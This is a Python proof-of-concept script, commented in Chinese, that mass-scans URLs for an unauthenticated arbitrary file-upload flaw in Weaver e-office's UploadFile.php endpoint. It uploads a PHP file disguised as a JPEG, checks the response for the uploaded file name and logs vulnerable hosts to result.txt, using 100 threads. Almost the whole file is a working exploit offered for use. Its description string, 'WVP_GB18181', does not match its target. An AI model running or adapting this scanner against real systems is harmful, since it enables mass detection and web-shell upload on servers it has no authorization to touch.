import argparse,requests,sys,json,re  # 导包
from multiprocessing.dummy import Pool  # 导入多线程
requests.packages.urllib3.disable_warnings()  # 过滤报错


def banner():
    text = """███████╗ ██████╗ ███████╗███████╗██╗ ██████╗███████╗
██╔════╝██╔═══██╗██╔════╝██╔════╝██║██╔════╝██╔════╝
█████╗  ██║   ██║█████╗  █████╗  ██║██║     █████╗  
██╔══╝  ██║   ██║██╔══╝  ██╔══╝  ██║██║     ██╔══╝  
███████╗╚██████╔╝██║     ██║     ██║╚██████╗███████╗
╚══════╝ ╚═════╝ ╚═╝     ╚═╝     ╚═╝ ╚═════╝╚══════╝
                      version=1.1.1                              """
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description='WVP_GB18181')  # 定义脚本信息
    parser.add_argument('-u', '--url', dest='url', type=str, help='please input your url')  # 定义参数
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your file')
    args = parser.parse_args()
    # print(args.url)
    if args.url and not args.file:  # 单个url
        poc(args.url)
    elif args.file and not args.url:  # 多线程
        urls = []
        with open(args.file, 'r', encoding='utf-8') as fp:  # 读取输入的文件
            for url in fp.readlines():
                urls.append(url.strip())
        mp = Pool(100)
        mp.map(poc, urls)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(targer):
    payload = "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/86.0.4240.111Safari/537.36',
        'Accept-Encoding':'gzip,deflate',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Connection':'close',
        'Accept-Language':'zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6',
        'Content-Length':'193',
        'Content-Type':'multipart/form-data;boundary=e64bdf16c554bbc109cecef6451c26a4',
    }
    data = '--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo 123;?>\r\n--e64bdf16c554bbc109cecef6451c26a4--'
    # proxies = {
    #     'http':'http:127.0.0.1:8080',
    #     'https':'http:127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=targer+payload,headers=headers,data=data,verify=False,timeout=10)  # post发送请求
        if res.status_code == 200:  # 判断返回状态码是否为200
            if 'logo-eoffice.php' in res.text:  # 判断是否存在漏洞
                print(f'[+]{targer}存在漏洞')
                with open('result.txt','a',) as fp:  # 将漏洞写入到文件中
                    fp.write(targer+'\n')
            else:
                print(f'[-]{targer}不存在漏洞')
    except:
        pass


if __name__ == '__main__':
    main()